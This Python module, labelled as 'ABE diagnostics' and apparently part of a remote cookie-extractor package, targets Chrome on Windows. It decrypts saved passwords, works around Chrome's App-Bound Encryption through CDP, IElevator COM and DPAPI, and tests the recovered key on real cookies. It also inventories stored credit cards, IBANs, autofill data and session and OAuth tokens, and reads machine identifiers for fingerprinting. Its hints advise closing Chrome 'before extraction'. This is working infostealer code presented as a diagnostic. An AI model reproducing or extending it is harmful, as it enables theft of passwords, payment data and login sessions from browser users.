"""ABE diagnostics for client_config."""
from __future__ import annotations

import base64
import json
import os
import shutil
import sqlite3
import tempfile
from pathlib import Path
from typing import Any

from remote_client.cookie_extractor import ABE_AVAILABLE
from remote_client.cookie_extractor.browsers import BROWSER_CONFIG, resolve_path
from remote_client.cookie_extractor.decrypt import get_dpapi, load_local_state_key


def _load_chrome_local_state() -> Path | None:
    config = BROWSER_CONFIG.get("chrome") or {}
    raw_path = config.get("local_state")
    if not raw_path:
        return None
    return resolve_path(raw_path)


def _get_chrome_user_data_dir() -> Path | None:
    """Get Chrome User Data directory."""
    if os.name == "nt":
        local_app_data = os.environ.get("LOCALAPPDATA", "")
        if local_app_data:
            path = Path(local_app_data) / "Google" / "Chrome" / "User Data"
            if path.exists():
                return path
    return None


def _get_chrome_profile_path(profile: str = "Default") -> Path | None:
    """Get Chrome profile directory."""
    user_data = _get_chrome_user_data_dir()
    if user_data:
        profile_path = user_data / profile
        if profile_path.exists():
            return profile_path
    return None


def _load_password_decryption_key(local_state: Path | None) -> bytes | None:
    if not local_state or not local_state.exists():
        return None
    dpapi = None
    if os.name == "nt":
        try:
            dpapi = get_dpapi()
        except Exception:
            dpapi = None
    try:
        return load_local_state_key(local_state, dpapi, "chrome")
    except Exception:
        return None


def _count_passwords() -> dict[str, Any]:
    """Count and optionally decrypt saved passwords in Chrome Login Data."""
    result = {
        "total": 0, 
        "encrypted": 0, 
        "decrypted": 0,
        "v20_count": 0,
        "domains": [],
        "decryption_available": False,
    }
    profile_path = _get_chrome_profile_path()
    if not profile_path:
        return result
    
    login_data = profile_path / "Login Data"
    if not login_data.exists():
        return result
    
    temp_db = _copy_db(login_data)
    if not temp_db:
        return result
    
    # Try to get decryption key
    user_data_dir = _get_chrome_user_data_dir()
    local_state = user_data_dir / "Local State" if user_data_dir else None
    decryption_key = _load_password_decryption_key(local_state)
    
    # Also try to get ABE decryptor for v20 passwords
    abe_decryptor = None
    if local_state and local_state.exists():
        try:
            from remote_client.cookie_extractor.app_bound_encryption import AppBoundDecryptor
            abe_decryptor = AppBoundDecryptor(local_state)
            if abe_decryptor.is_available:  # is_available is a property, not method
                result["decryption_available"] = True
        except Exception:
            pass
    
    if decryption_key is not None:
        result["decryption_available"] = True
    
    conn = None
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Count total passwords
        cursor.execute("SELECT COUNT(*) FROM logins WHERE blacklisted_by_user = 0")
        result["total"] = cursor.fetchone()[0]
        
        # Count encrypted passwords and try decryption
        cursor.execute("SELECT password_value, origin_url FROM logins WHERE blacklisted_by_user = 0 LIMIT 100")
        encrypted_count = 0
        v20_count = 0
        decrypted_count = 0
        domains = set()
        
        dpapi = None
        if os.name == "nt":
            try:
                import win32crypt
                dpapi = win32crypt
            except ImportError:
                pass
        
        for password_value, origin_url in cursor:
            if password_value:
                pwd_bytes = bytes(password_value)
                if pwd_bytes.startswith((b"v10", b"v20", b"v11", b"v12")):
                    encrypted_count += 1
                    if pwd_bytes.startswith(b"v20"):
                        v20_count += 1
                        # Try ABE decryptor for v20 passwords
                        if abe_decryptor and abe_decryptor.is_available:
                            try:
                                plaintext = abe_decryptor.decrypt_value(pwd_bytes)
                                if plaintext:
                                    decrypted_count += 1
                                    continue  # Successfully decrypted
                            except Exception:
                                pass
                    
                    # Try standard AES-GCM decryption for v10/v11/v12 or as fallback
                    if decryption_key:
                        try:
                            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                            nonce = pwd_bytes[3:15]
                            ciphertext = pwd_bytes[15:]
                            aesgcm = AESGCM(decryption_key)
                            plaintext = aesgcm.decrypt(nonce, ciphertext, None)
                            if plaintext:
                                decrypted_count += 1
                        except Exception:
                            pass
                elif dpapi:
                    # Try legacy DPAPI decryption
                    try:
                        decrypted = dpapi.CryptUnprotectData(pwd_bytes, None, None, None, 0)[1]
                        if decrypted:
                            decrypted_count += 1
                    except Exception:
                        pass
            
            if origin_url:
                try:
                    from urllib.parse import urlparse
                    domain = urlparse(origin_url).netloc
                    if domain:
                        domains.add(domain)
                except Exception:
                    pass
        
        result["encrypted"] = encrypted_count
        result["v20_count"] = v20_count
        result["decrypted"] = decrypted_count
        result["domains"] = list(domains)[:10]  # Top 10 domains
        
        conn.close()
    except Exception:
        if conn:
            try:
                conn.close()
            except Exception:
                pass
    finally:
        try:
            temp_db.unlink(missing_ok=True)
        except Exception:
            pass
    
    return result


def _count_payment_methods() -> dict[str, Any]:
    """Count saved payment methods (credit cards) in Chrome Web Data."""
    result = {"cards": 0, "card_types": [], "ibans": 0}
    profile_path = _get_chrome_profile_path()
    if not profile_path:
        return result
    
    web_data = profile_path / "Web Data"
    if not web_data.exists():
        return result
    
    temp_db = _copy_db(web_data)
    if not temp_db:
        return result
    
    conn = None
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Count credit cards
        try:
            cursor.execute("SELECT COUNT(*) FROM credit_cards")
            result["cards"] = cursor.fetchone()[0]
            
            # Get card types/networks
            cursor.execute("SELECT DISTINCT card_type FROM credit_cards WHERE card_type IS NOT NULL AND card_type != ''")
            card_types = [row[0] for row in cursor.fetchall()]
            result["card_types"] = card_types
        except Exception:
            pass
        
        # Count IBANs
        try:
            cursor.execute("SELECT COUNT(*) FROM local_ibans")
            result["ibans"] = cursor.fetchone()[0]
        except Exception:
            try:
                cursor.execute("SELECT COUNT(*) FROM ibans")
                result["ibans"] = cursor.fetchone()[0]
            except Exception:
                pass
        
        conn.close()
    except Exception:
        if conn:
            try:
                conn.close()
            except Exception:
                pass
    finally:
        try:
            temp_db.unlink(missing_ok=True)
        except Exception:
            pass
    
    return result


def _count_autofill_data() -> dict[str, Any]:
    """Count autofill entries and addresses."""
    result = {"entries": 0, "addresses": 0, "profiles": 0}
    profile_path = _get_chrome_profile_path()
    if not profile_path:
        return result
    
    web_data = profile_path / "Web Data"
    if not web_data.exists():
        return result
    
    temp_db = _copy_db(web_data)
    if not temp_db:
        return result
    
    conn = None
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Count autofill entries
        try:
            cursor.execute("SELECT COUNT(*) FROM autofill")
            result["entries"] = cursor.fetchone()[0]
        except Exception:
            pass
        
        # Count addresses
        try:
            cursor.execute("SELECT COUNT(*) FROM autofill_profiles")
            result["profiles"] = cursor.fetchone()[0]
        except Exception:
            pass
        
        try:
            cursor.execute("SELECT COUNT(*) FROM local_addresses")
            result["addresses"] = cursor.fetchone()[0]
        except Exception:
            pass
        
        conn.close()
    except Exception:
        if conn:
            try:
                conn.close()
            except Exception:
                pass
    finally:
        try:
            temp_db.unlink(missing_ok=True)
        except Exception:
            pass
    
    return result


def _get_browser_fingerprint() -> dict[str, Any]:
    """Generate browser fingerprint data from Chrome profile."""
    result = {
        "device_id": None,
        "machine_id": None,
        "profile_id": None,
        "client_id": None,
        "installation_date": None,
    }
    
    # Get device/machine ID from Local State
    local_state_path = _load_chrome_local_state()
    if local_state_path and local_state_path.exists():
        try:
            raw = local_state_path.read_text(encoding="utf-8")
            data = json.loads(raw)
            
            # Various identifiers from Local State
            if "user_experience_metrics" in data:
                metrics = data["user_experience_metrics"]
                if isinstance(metrics, dict):
                    result["client_id"] = metrics.get("client_id")
                    result["installation_date"] = metrics.get("installation_date")
            
            # Device ID from uninstall metrics
            if "uninstall_metrics" in data:
                uninstall = data["uninstall_metrics"]
                if isinstance(uninstall, dict):
                    result["device_id"] = uninstall.get("installation_date2")
            
            # Profile info
            if "profile" in data:
                profile = data["profile"]
                if isinstance(profile, dict):
                    result["profile_id"] = profile.get("last_used")
                    
        except Exception:
            pass
    
    # Generate machine fingerprint from hardware info
    if os.name == "nt":
        try:
            # Get machine GUID from registry
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Cryptography",
                0,
                winreg.KEY_READ | winreg.KEY_WOW64_64KEY
            )
            machine_guid, _ = winreg.QueryValueEx(key, "MachineGuid")
            winreg.CloseKey(key)
            result["machine_id"] = machine_guid
        except Exception:
            pass
    
    return result


def _count_tokens_and_sessions() -> dict[str, Any]:
    """Count authentication tokens and sessions from cookies."""
    result = {
        "session_cookies": 0,
        "auth_tokens": 0,
        "oauth_tokens": 0,
        "jwt_tokens": 0,
        "services": [],
    }
    
    profile_path = _get_chrome_profile_path()
    if not profile_path:
        return result
    
    cookies_db = profile_path / "Network" / "Cookies"
    if not cookies_db.exists():
        cookies_db = profile_path / "Cookies"
    if not cookies_db.exists():
        return result
    
    temp_db = _copy_db(cookies_db)
    if not temp_db:
        return result
    
    conn = None
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Token patterns to search for
        token_patterns = [
            ("session", ["session", "sess_", "sid", "PHPSESSID", "JSESSIONID", "ASP.NET_SessionId"]),
            ("auth", ["auth", "token", "access_token", "bearer", "api_key", "apikey"]),
            ("oauth", ["oauth", "refresh_token", "id_token"]),
        ]
        
        services = set()
        
        cursor.execute("SELECT name, host_key, value, encrypted_value FROM cookies")
        for name, host, value, encrypted_value in cursor:
            name_lower = name.lower() if name else ""
            
            # Check for session cookies
            for pattern_type, patterns in token_patterns:
                for pattern in patterns:
                    if pattern.lower() in name_lower:
                        if pattern_type == "session":
                            result["session_cookies"] += 1
                        elif pattern_type == "auth":
                            result["auth_tokens"] += 1
                        elif pattern_type == "oauth":
                            result["oauth_tokens"] += 1
                        break
            
            # Check for JWT tokens (in value)
            if value and isinstance(value, str):
                if value.startswith("eyJ") and value.count(".") == 2:
                    result["jwt_tokens"] += 1
            
            # Collect services
            if host:
                host_clean = host.lstrip(".")
                if host_clean:
                    # Extract main domain
                    parts = host_clean.split(".")
                    if len(parts) >= 2:
                        main_domain = ".".join(parts[-2:])
                        services.add(main_domain)
        
        result["services"] = sorted(list(services))[:20]  # Top 20 services
        
        conn.close()
    except Exception:
        if conn:
            try:
                conn.close()
            except Exception:
                pass
    finally:
        try:
            temp_db.unlink(missing_ok=True)
        except Exception:
            pass
    
    return result


def _read_chrome_version_from_registry() -> str | None:
    """Read Chrome version from Windows registry if Local State is unavailable."""
    if os.name != "nt":
        return None
    try:
        import winreg
        # Try different registry paths where Chrome version might be stored
        registry_paths = [
            (winreg.HKEY_CURRENT_USER, r"Software\Google\Chrome\BLBeacon"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Google\Chrome\BLBeacon"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Wow6432Node\Google\Chrome\BLBeacon"),
            (winreg.HKEY_CURRENT_USER, r"Software\Google\Update\Clients\{8A69D345-D564-463c-AFF1-A69D9E530F96}"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Google\Update\Clients\{8A69D345-D564-463c-AFF1-A69D9E530F96}"),
        ]
        for hkey, path in registry_paths:
            try:
                key = winreg.OpenKey(hkey, path, 0, winreg.KEY_READ)
                try:
                    # Try "version" first, then "pv" (product version)
                    for value_name in ("version", "pv"):
                        try:
                            value, _ = winreg.QueryValueEx(key, value_name)
                            if isinstance(value, str) and value.strip():
                                return value.strip()
                        except FileNotFoundError:
                            continue
                finally:
                    winreg.CloseKey(key)
            except FileNotFoundError:
                continue
            except Exception:
                continue
    except ImportError:
        pass
    except Exception:
        pass
    return None


def _read_encrypted_key(local_state_path: Path) -> tuple[bytes | None, str | None]:
    try:
        raw = local_state_path.read_text(encoding="utf-8")
        data = json.loads(raw)
    except Exception:
        return None, None
    encrypted_key_b64 = None
    if isinstance(data, dict):
        encrypted_key_b64 = (
            data.get("os_crypt", {}).get("encrypted_key")
            if isinstance(data.get("os_crypt"), dict)
            else None
        )
    if not isinstance(encrypted_key_b64, str):
        return None, _read_chrome_version(data)
    try:
        encrypted_key = base64.b64decode(encrypted_key_b64)
    except Exception:
        encrypted_key = None
    return encrypted_key, _read_chrome_version(data)


def _read_chrome_version(payload: dict | None) -> str | None:
    if not isinstance(payload, dict):
        return None
    browser = payload.get("browser") if isinstance(payload.get("browser"), dict) else {}
    version = browser.get("last_version") if isinstance(browser, dict) else None
    if isinstance(version, str) and version.strip():
        return version.strip()
    return None


def _copy_db(db_path: Path) -> Path | None:
    try:
        handle = tempfile.NamedTemporaryFile(prefix="rc_abe_", suffix=db_path.suffix, delete=False)
        temp_path = Path(handle.name)
        handle.close()
        shutil.copyfile(db_path, temp_path)
        return temp_path
    except Exception:
        return None


def _validate_abe_key(key: bytes) -> bool:
    """
    Validate an ABE key by trying to decrypt a real v20 cookie.
    Returns True if the key successfully decrypts at least one v20 value.
    """
    if not key or len(key) != 32:
        return False
    
    config = BROWSER_CONFIG.get("chrome") or {}
    cookie_paths = config.get("cookie_paths") or []
    
    for path in cookie_paths:
        resolved = resolve_path(path)
        if not resolved or not resolved.exists():
            continue
        temp_db = _copy_db(resolved)
        if not temp_db:
            continue
        
        conn = None
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            # Get first few v20 cookies to test
            cursor.execute("SELECT encrypted_value FROM cookies WHERE encrypted_value IS NOT NULL LIMIT 10")
            
            for (encrypted_value,) in cursor:
                if not encrypted_value:
                    continue
                ev_bytes = bytes(encrypted_value)
                if not ev_bytes.startswith(b"v20"):
                    continue
                
                # Try to decrypt
                try:
                    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                    nonce = ev_bytes[3:15]
                    ciphertext = ev_bytes[15:]
                    aesgcm = AESGCM(key)
                    plaintext = aesgcm.decrypt(nonce, ciphertext, None)
                    # If we get here without exception, the key works!
                    if plaintext:
                        conn.close()
                        return True
                except Exception:
                    # Key doesn't work for this cookie
                    pass
            
            conn.close()
        except Exception:
            if conn:
                try:
                    conn.close()
                except Exception:
                    pass
        finally:
            try:
                temp_db.unlink(missing_ok=True)
            except Exception:
                pass
    
    return False


def _count_v20_cookies() -> tuple[int, int] | None:
    config = BROWSER_CONFIG.get("chrome") or {}
    cookie_paths = config.get("cookie_paths") or []
    for path in cookie_paths:
        resolved = resolve_path(path)
        if not resolved or not resolved.exists():
            continue
        temp_db = _copy_db(resolved)
        if not temp_db:
            continue
        conn = None
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT encrypted_value FROM cookies")
            total = 0
            v20 = 0
            for (encrypted_value,) in cursor:
                total += 1
                if encrypted_value and bytes(encrypted_value).startswith(b"v20"):
                    v20 += 1
            conn.close()
            return v20, total
        except Exception:
            try:
                if conn is not None:
                    conn.close()
            except Exception:
                pass
        finally:
            try:
                temp_db.unlink(missing_ok=True)
            except Exception:
                pass
    return None


def _generate_recommendation(result: dict[str, Any], support: dict[str, Any]) -> str:
    """Generate automatic recommendations based on diagnostics."""
    recommendations: list[str] = []
    
    # Check if ABE is detected but not available
    if result.get("detected") and not result.get("available"):
        # CDP is the best option for Chrome 127+
        if not support.get("cdp_available"):
            recommendations.append(
                "Install websocket-client for CDP extraction (recommended for Chrome 127+): "
                "pip install websocket-client"
            )
        
        if not support.get("ielevator_available") and not support.get("dpapi_available"):
            recommendations.append("Also install comtypes and pywin32 as fallback: pip install comtypes pywin32")
    
    # Check if Chrome is not installed
    if not support.get("chrome_installed"):
        recommendations.append("Chrome is not installed or not found in standard locations")
    
    # Check if elevation service is missing
    if support.get("chrome_installed") and not support.get("elevation_service"):
        recommendations.append("Chrome Elevation Service not found - ensure Chrome is fully installed")
    
    # Check Local State issues
    if not result.get("local_state_found"):
        recommendations.append("Chrome Local State file not found - run Chrome at least once")
    
    # Check for low success rate
    success_rate = result.get("success_rate")
    if success_rate is not None and success_rate < 50.0:
        # For Chrome 127+ with low success rate, recommend CDP
        chrome_version = result.get("chrome_version")
        if chrome_version:
            try:
                major_version = int(chrome_version.split(".")[0])
                if major_version >= 127:
                    if not support.get("cdp_available"):
                        recommendations.append(
                            f"Chrome {major_version}+ uses ABE. Install websocket-client for CDP: "
                            "pip install websocket-client"
                        )
                    else:
                        recommendations.append(
                            f"Low success rate ({success_rate:.1f}%) with Chrome {major_version}+. "
                            "Try closing Chrome before extraction for CDP to work properly."
                        )
            except (ValueError, IndexError):
                pass
        else:
            recommendations.append(
                f"Low decryption success rate ({success_rate:.1f}%) - "
                "try using CDP method or running as the correct user"
            )
    
    # Check Chrome version for ABE requirements
    chrome_version = result.get("chrome_version")
    if chrome_version:
        try:
            major_version = int(chrome_version.split(".")[0])
            if major_version >= 127 and not result.get("available"):
                if support.get("cdp_available"):
                    recommendations.append(
                        f"Chrome {major_version}+ detected with ABE. CDP available but may need Chrome to be closed."
                    )
                else:
                    recommendations.append(
                        f"Chrome {major_version}+ uses App-Bound Encryption - "
                        "CDP is the recommended method: pip install websocket-client"
                    )
        except (ValueError, IndexError):
            pass
    
    return "; ".join(recommendations) if recommendations else ""


def _calculate_success_rate(cookies_v20: int | None, cookies_total: int | None, available: bool) -> float | None:
    """Calculate success rate for decryption based on available data."""
    if cookies_total is None or cookies_total == 0:
        return None
    
    if cookies_v20 is None:
        return None
    
    # If ABE decryption is available, all v20 cookies can be decrypted
    if available:
        return 100.0
    
    # If v20 cookies exist but ABE not available, only non-v20 cookies can be decrypted
    non_v20 = cookies_total - cookies_v20
    return (non_v20 / cookies_total) * 100.0


def collect_abe_status() -> dict[str, Any]:
    result: dict[str, Any] = {
        "status": "unknown",
        "detected": False,
        "available": False,
        "method": None,
        "recommendation": "",
        "chrome_version": None,
        "local_state_found": False,
        "cookies_v20": None,
        "cookies_total": None,
        "success_rate": None,
        "cdp_available": False,
        # Extended data
        "passwords": None,
        "payment_methods": None,
        "autofill": None,
        "tokens": None,
        "fingerprint": None,
    }
    if not ABE_AVAILABLE:
        result["status"] = "blocked"
        return result
    try:
        from remote_client.cookie_extractor.app_bound_encryption import (
            check_abe_support,
            decrypt_abe_key_with_dpapi,
            is_abe_encrypted_key,
            _try_ielevator_com_decrypt,
            CDPCookieExtractor,
            try_cdp_cookie_extraction,
        )
    except Exception:
        result["status"] = "blocked"
        return result

    support = check_abe_support()
    result.update({k: support.get(k) for k in support.keys()})

    local_state_path = _load_chrome_local_state()
    if local_state_path and local_state_path.exists():
        result["local_state_found"] = True
        encrypted_key, chrome_version = _read_encrypted_key(local_state_path)
        if chrome_version:
            result["chrome_version"] = chrome_version
        if encrypted_key:
            detected = is_abe_encrypted_key(encrypted_key)
            result["detected"] = detected
            if detected:
                method = None
                decrypted = None
                
                # Priority 1: Try CDP (most reliable for Chrome 127+)
                if support.get("cdp_available"):
                    try:
                        cdp_success, cdp_cookies = try_cdp_cookie_extraction("chrome")
                        if cdp_success and cdp_cookies:
                            # CDP worked! Mark as available
                            decrypted = True  # Signal that decryption is possible
                            method = "CDP"
                            result["cdp_available"] = True
                    except Exception:
                        pass
                
                # Priority 2: Try IElevator COM
                if not decrypted and support.get("ielevator_available"):
                    try:
                        decrypted = _try_ielevator_com_decrypt(encrypted_key)
                        if decrypted:
                            method = "IElevator"
                    except Exception:
                        decrypted = None
                
                # Priority 3: Try DPAPI (with validation)
                if not decrypted and support.get("dpapi_available"):
                    try:
                        dpapi_key = decrypt_abe_key_with_dpapi(encrypted_key)
                        if dpapi_key and len(dpapi_key) == 32:
                            # Validate key by trying to decrypt a v20 cookie
                            if _validate_abe_key(dpapi_key):
                                decrypted = dpapi_key
                                method = "DPAPI"
                    except Exception:
                        decrypted = None
                
                if decrypted:
                    result["available"] = True
                    result["method"] = method
                    
                    # If we have a valid key, test actual AES-GCM decryption
                    if isinstance(decrypted, bytes) and len(decrypted) == 32:
                        result["aes_gcm_working"] = _validate_abe_key(decrypted)
                    else:
                        result["aes_gcm_working"] = method == "CDP"  # CDP always works

    # Fallback: read Chrome version from Windows registry if not found in Local State
    if not result["chrome_version"]:
        registry_version = _read_chrome_version_from_registry()
        if registry_version:
            result["chrome_version"] = registry_version

    windows_ok = bool(support.get("windows"))
    chrome_installed = bool(support.get("chrome_installed"))
    if not windows_ok or not chrome_installed:
        result["status"] = "blocked"
    elif not result["detected"]:
        result["status"] = "available"
    elif result["available"]:
        result["status"] = "available"
    elif support.get("cdp_available") or support.get("ielevator_available") or support.get("dpapi_available"):
        result["status"] = "detected"
    else:
        result["status"] = "blocked"

    # Count v20 cookies
    counts = _count_v20_cookies()
    if counts:
        v20, total = counts
        result["cookies_v20"] = v20
        result["cookies_total"] = total
    
    # Calculate success rate
    result["success_rate"] = _calculate_success_rate(
        result["cookies_v20"],
        result["cookies_total"],
        result["available"]
    )
    
    # Collect extended data
    result["passwords"] = _count_passwords()
    result["payment_methods"] = _count_payment_methods()
    result["autofill"] = _count_autofill_data()
    result["tokens"] = _count_tokens_and_sessions()
    result["fingerprint"] = _get_browser_fingerprint()
    
    # Generate automatic recommendation based on diagnostics
    result["recommendation"] = _generate_recommendation(result, support)
    
    return result
